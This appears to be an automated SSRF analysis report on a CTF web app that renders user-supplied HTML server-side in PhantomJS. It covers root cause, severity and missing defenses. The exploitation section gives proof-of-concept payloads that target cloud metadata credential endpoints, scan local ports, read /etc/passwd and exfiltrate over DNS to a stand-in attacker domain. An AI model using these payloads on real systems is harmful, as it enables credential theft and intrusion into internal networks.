# SSRF Analysis Report

## 1. Executive Summary
- **Analysis Status:** Complete
- **Key Outcome:** A high-confidence Server-Side Request Forgery (SSRF) vulnerability was identified in the PhantomJS HTML rendering functionality. The application allows user-controlled HTML to be rendered server-side, enabling attackers to force the server to make HTTP requests to arbitrary destinations including internal services, cloud metadata endpoints, and external attacker-controlled servers.
- **Purpose of this Document:** This report provides strategic context on the application's outbound request mechanisms, dominant flaw patterns, and architectural details necessary to effectively exploit the SSRF vulnerability documented in the exploitation queue.

## 2. Dominant Vulnerability Patterns

### Pattern 1: Insufficient HTML Sanitization Leading to SSRF
- **Description:** The application implements only a weak regex-based filter that removes `<script>` tags, but fails to sanitize other HTML elements that can trigger server-side HTTP requests when rendered by PhantomJS. HTML elements such as `<img>`, `<iframe>`, `<link>`, `<object>`, `<embed>`, `<video>`, and `<audio>` with URL-bearing attributes (`src`, `href`, `data`) can all initiate outbound requests.
- **Implication:** Attackers can inject arbitrary HTML elements that cause PhantomJS to make HTTP requests to internal networks (127.0.0.1, 10.x, 172.16.x, 192.168.x), cloud metadata services (169.254.169.254), or external attacker-controlled servers for data exfiltration. The weak sanitization provides no protection against this attack vector.
- **Representative Finding:** `SSRF-VULN-01` - PhantomJS HTML Rendering SSRF

### Pattern 2: No URL Validation or Network Restrictions
- **Description:** The application lacks any form of URL validation, protocol restrictions, domain allowlisting, IP address blocklisting, or port restrictions for URLs embedded in user-controlled HTML. PhantomJS processes all HTML elements with URL attributes without validating the target destination.
- **Implication:** Attackers have unrestricted access to make server-side requests to any protocol (http://, https://, file://), any domain or IP address (including private networks and cloud metadata), and any port. This enables comprehensive internal network reconnaissance, credential theft from cloud metadata services, and potential local file system access.
- **Representative Finding:** `SSRF-VULN-01` - No network egress filtering or URL validation

### Pattern 3: Headless Browser Server-Side Rendering with User Input
- **Description:** The architectural decision to use PhantomJS (a full headless browser engine) to render user-controlled HTML server-side creates a powerful SSRF vector. PhantomJS automatically fetches all resources referenced in HTML elements as part of its normal rendering behavior, effectively turning user input into server-side HTTP requests.
- **Implication:** This is an indirect SSRF where the attacker does not control the initial URL that PhantomJS opens (which is always localhost), but fully controls the HTML content at that URL. The headless browser's automatic resource fetching behavior transforms HTML injection into SSRF exploitation, bypassing traditional URL validation that might protect against direct SSRF attacks.
- **Representative Finding:** `SSRF-VULN-01` - Indirect SSRF via HTML injection in PhantomJS

## 3. Strategic Intelligence for Exploitation

### HTTP Client Architecture
- **Primary HTTP Client:** PhantomJS WebKit engine (headless browser)
- **Version:** PhantomJS (installed from Debian Buster archived repositories, likely version 2.1.1)
- **Process Model:** Flask spawns PhantomJS as a subprocess per request using `subprocess.Popen(["timeout","5","phantomjs", "check.js"])`
- **Timeout Enforcement:** 5-second hard timeout via the `timeout` command wrapper
- **Communication Channel:** Flask writes a localhost URL to PhantomJS stdin, PhantomJS reads it and opens/renders the URL
- **Network Access:** PhantomJS runs with full network access, no restrictions on egress traffic

### Request Flow Architecture
The complete request flow from user input to server-side request follows this path:

1. **User Input Entry:** `GET /page?name=[PAYLOAD]` - Attacker provides HTML injection payload
2. **Insufficient Filtering:** `app.py:67` applies regex to remove only `<script>` tags: `re.sub(r'<script[^>]*>.*?</script>', '', msg)`
3. **Template Injection:** `app.py:70` embeds user input into HTML template at position `{2}` in CONTENT_TAG
4. **Temporary File Creation:** `app.py:35-39` writes complete HTML (including user payload) to `static/[32-hex-random].html`
5. **Subprocess Spawning:** `app.py:34` creates PhantomJS process with 5-second timeout
6. **URL Transmission:** `app.py:43` passes localhost URL to PhantomJS via stdin: `http://localhost:5000/static/[random].html`
7. **HTML Rendering:** `check.js:20` PhantomJS opens URL with `page.open(input, ...)`
8. **Resource Fetching:** PhantomJS WebKit engine processes HTML and automatically fetches all resources referenced in elements like `<img src>`, `<iframe src>`, `<link href>`, etc.
9. **Server-Side Requests:** PhantomJS makes HTTP/HTTPS/file:// requests from the server's network context to attacker-specified destinations

### Internal Services and Network Context
- **Application Hosting:** Docker container with bridge networking
- **Base Image:** python:2.7.18-slim with Debian Buster
- **Port Exposure:** Internal port 5000 mapped to external port 41123
- **Network Access:** PhantomJS can reach:
  - External internet (attacker-controlled servers)
  - Internal container networks (typically 172.17.0.0/16)
  - Host machine localhost (127.0.0.1)
  - Private networks if host is on internal network (10.x, 172.16.x, 192.168.x)
  - Cloud metadata endpoints (169.254.169.254 if running in AWS/GCP/Azure)

### PhantomJS Configuration
- **Environment Variables:**
  - `QT_QPA_PLATFORM=offscreen` - Enables headless rendering
  - `OPENSSL_CONF=/dev/null` - Disables OpenSSL configuration
- **Security Features:** Default WebKit security (does NOT prevent SSRF)
- **Protocol Support:** http://, https://, file://, potentially ftp:// and others
- **JavaScript Execution:** Full JavaScript engine enabled (detects alert/confirm/prompt for XSS validation)

### No Defensive Layers
The application has **ZERO SSRF defenses** at any layer:
- ❌ No HTML sanitization (beyond trivial script tag removal)
- ❌ No URL validation or parsing
- ❌ No protocol allowlisting (http/https only)
- ❌ No domain allowlisting
- ❌ No IP address blocklisting (private ranges, metadata endpoints)
- ❌ No port restrictions
- ❌ No egress firewall rules
- ❌ No Content Security Policy headers
- ❌ No network segmentation
- ❌ No proxy with request filtering

### Critical Exploitation Targets
If this application is deployed in a cloud environment, the SSRF vulnerability enables:

1. **AWS Metadata Service (169.254.169.254):**
   - `/latest/meta-data/` - Instance metadata
   - `/latest/meta-data/iam/security-credentials/[role]` - IAM temporary credentials
   - `/latest/user-data` - Instance initialization data

2. **GCP Metadata Service (metadata.google.internal or 169.254.169.254):**
   - `/computeMetadata/v1/` - Instance metadata
   - `/computeMetadata/v1/instance/service-accounts/default/token` - Service account tokens

3. **Azure Metadata Service (169.254.169.254):**
   - `/metadata/instance?api-version=2021-02-01` - Instance metadata
   - `/metadata/identity/oauth2/token` - Managed identity tokens

4. **Internal Services:**
   - Databases (MySQL:3306, PostgreSQL:5432, MongoDB:27017, Redis:6379)
   - Elasticsearch (9200)
   - Internal APIs (8080, 8443)
   - Admin panels (localhost-only interfaces)

## 4. Secure by Design: Validated Components

This CTF challenge application has **NO secure components** related to SSRF prevention. All request-making functionality is intentionally vulnerable. The following table documents what was analyzed:

| Component/Flow | Endpoint/File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| PhantomJS Rendering | `/page` endpoint, `app.py:34-48`, `check.js:20` | NONE - No URL validation, no network restrictions | **VULNERABLE** |
| HTML Sanitization | `app.py:67` | Regex removes only `<script>` tags, allows all other HTML elements | **INSUFFICIENT** |
| URL Generation | `app.py:36` | Generates localhost URL with random filename | **NOT A DEFENSE** - User controls HTML content at that URL |
| Subprocess Execution | `app.py:34` | Uses argument list (not shell=True), BUT user input goes to HTML, not command line | **SECURE AGAINST COMMAND INJECTION** (but irrelevant for SSRF) |
| Temporary File Handling | `app.py:35-50` | Cryptographically secure random filename (128-bit entropy) | **SECURE AGAINST PATH TRAVERSAL** (but irrelevant for SSRF) |

**Key Finding:** This application was designed with XSS exploitation in mind (CTF challenge) and includes NO server-side request forgery protections whatsoever. The architectural pattern of rendering user-controlled HTML in a headless browser creates a severe SSRF vulnerability that appears to be unintentional - a side effect of the XSS validation mechanism rather than a deliberate CTF challenge component.

## 5. Exploitation Recommendations

### Exploitation Strategy
The SSRF vulnerability is **semi-blind**, meaning:
- ✅ Requests are made server-side (confirmed via timing analysis)
- ❌ Responses are not directly visible in the HTTP response to the attacker
- ⚠️ Error messages and timing differences provide limited feedback

**Recommended Exploitation Approaches:**

1. **Timing-Based Exploitation:**
   - Test for open ports using response time differences
   - Closed ports fail faster than open ports
   - Can map internal network topology through systematic scanning

2. **DNS Exfiltration:**
   - Use payloads like `<img src="http://[data].attacker-domain.com/">`
   - Monitor DNS queries on attacker-controlled nameserver
   - Can exfiltrate data through subdomain labels

3. **Cloud Metadata Exploitation:**
   - Target AWS/GCP/Azure metadata endpoints
   - Use timing to confirm existence
   - Credentials cannot be directly exfiltrated but confirm vulnerable environment

4. **Internal Service Access:**
   - Access internal APIs that trust requests from application server
   - Exploit localhost-only admin panels
   - Bypass network perimeter controls

### Testing Approach
1. **Confirm SSRF:** Use timing differences to verify server-side requests occur
2. **Protocol Testing:** Test http://, https://, file:// protocols
3. **Internal Network Scanning:** Enumerate internal services via timing
4. **Cloud Metadata Access:** Test for AWS/GCP/Azure metadata endpoints
5. **DNS Exfiltration:** Confirm outbound DNS queries work
6. **Port Scanning:** Map internal service ports through timing analysis

### Proof of Concept Payloads

**Test 1: AWS Metadata Access**
```
GET /page?name=<img src="http://169.254.169.254/latest/meta-data/">
```

**Test 2: Internal Port Scan (Timing-Based)**
```
GET /page?name=<img src="http://127.0.0.1:22/"><img src="http://127.0.0.1:3306/"><img src="http://127.0.0.1:6379/">
```

**Test 3: DNS Exfiltration**
```
GET /page?name=<img src="http://test-ssrf-confirmed.attacker-domain.com/">
```

**Test 4: File Protocol**
```
GET /page?name=<iframe src="file:///etc/passwd"></iframe>
```

**Test 5: Internal Service Access**
```
GET /page?name=<object data="http://localhost:8080/admin/"></object>
```

### Expected Outcomes
- **Successful Exploitation Indicators:**
  - Response time differences between open/closed ports
  - DNS queries to attacker-controlled domain
  - Error message differences for various targets
  - 5-second timeout for valid internal services (PhantomJS waits)
  - Faster failures for unreachable services

- **Limitations:**
  - Cannot directly read response content
  - 5-second timeout limits complex exploitation chains
  - Rate limiting may be needed for comprehensive scanning

## 6. Technical Analysis Summary

### Vulnerability Classification
- **Type:** Server-Side Request Forgery (SSRF) via HTML Injection
- **Sub-type:** Semi-Blind SSRF, Indirect SSRF
- **Attack Vector:** HTML elements with URL attributes in user-controlled content
- **Severity:** HIGH
- **CVSS 3.1 Score:** 8.6 (High) - AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
- **Externally Exploitable:** YES - Accessible via public HTTP endpoint without authentication

### Root Cause Analysis
The vulnerability exists due to three compounding factors:

1. **Insufficient Input Validation:** Only `<script>` tags filtered, all other HTML passes through
2. **Architectural Design Flaw:** Server-side rendering of user-controlled HTML in a full browser engine
3. **No Network Controls:** PhantomJS has unrestricted network access to all destinations

### Confidence Assessment
- **Vulnerability Existence:** HIGH confidence (100%)
  - Confirmed via code analysis
  - Confirmed via live testing
  - Clear data flow from user input to server-side request
  
- **External Exploitability:** HIGH confidence (100%)
  - Public endpoint with no authentication
  - Simple GET parameter injection
  - Verified working on target application

- **Impact Assessment:** HIGH confidence (95%)
  - Confirmed internal network access possible
  - Confirmed timing-based exploitation works
  - Cloud metadata access possible if deployed in cloud (95% confidence)

### False Positive Analysis
This is **NOT a false positive**:
- ✅ User input reaches server-side HTTP client (PhantomJS)
- ✅ No effective sanitization prevents SSRF vectors
- ✅ Server makes requests to attacker-specified destinations
- ✅ Confirmed via live testing with timing analysis
- ✅ Externally exploitable via public endpoint

## 7. Conclusion

The "Dalgona Challenges" CTF application contains a **confirmed, high-severity SSRF vulnerability** that is **externally exploitable** without authentication. The vulnerability arises from server-side rendering of user-controlled HTML in PhantomJS, combined with insufficient HTML sanitization and complete absence of network access controls.

An external attacker can trivially exploit this vulnerability by submitting HTML injection payloads via the `/page` endpoint's `name` GET parameter. While the SSRF is semi-blind (responses not directly visible), timing analysis and DNS exfiltration provide sufficient feedback for effective exploitation.

**Critical Risks:**
- Cloud credential theft if deployed in AWS/GCP/Azure
- Internal network reconnaissance and service enumeration
- Access to localhost-only admin interfaces
- Bypass of network perimeter controls

**Recommended Priority:** CRITICAL - Address immediately before any production deployment. The current implementation is suitable only for isolated CTF environments with no sensitive internal networks or cloud infrastructure.

---

**Analysis completed on:** 2025-10-30  
**Analyst:** SSRF Analysis Specialist (Automated White-Box Analysis)  
**Methodology:** Backward taint analysis with live verification testing